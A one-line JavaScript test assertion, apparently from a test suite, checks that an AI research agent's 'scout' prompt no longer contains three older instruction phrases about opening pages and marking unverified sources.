       for (const old of ['WebFetch must actually OPEN pages', 'open at least 3 distinct real sources', 'Search-snippet-only or from-memory items are verified:false']) assert.ok(!scout.includes(old), `scout prompt still says "${old}"`);
